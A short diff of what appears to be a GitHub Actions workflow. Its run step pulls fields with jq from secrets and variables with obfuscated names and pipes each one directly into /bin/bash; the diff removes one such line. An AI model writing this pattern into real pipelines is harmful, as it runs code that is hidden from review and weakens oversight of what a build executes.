@@ -21,7 +21,6 @@ jobs:
           xankr5128: ${{ secrets.xankr5128 }}
         run: |
           printf '%s' "$xankr5128" | jq -r .h115 | /bin/bash
-          echo $bq387 | jq -r .gc812 | /bin/bash
           echo $aj646 | jq -r .q14144 | /bin/bash
           printf '%s' "$jc578" | jq -r .qva7 | /bin/bash
           printf '%s' "$bal8139" | jq -r .xmjgn9720 | /bin/bash
